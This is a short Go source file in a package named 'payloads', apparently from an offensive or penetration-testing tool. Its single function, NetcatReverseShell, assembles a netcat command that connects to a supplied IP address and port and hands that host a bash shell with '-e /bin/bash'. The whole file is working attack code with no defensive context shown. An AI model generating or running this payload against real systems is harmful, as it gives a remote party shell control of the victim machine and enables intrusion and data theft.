package payloads

func NetcatReverseShell(ip, port string) string {
	return "nc " + ip + " " + port + " -e /bin/bash"
}
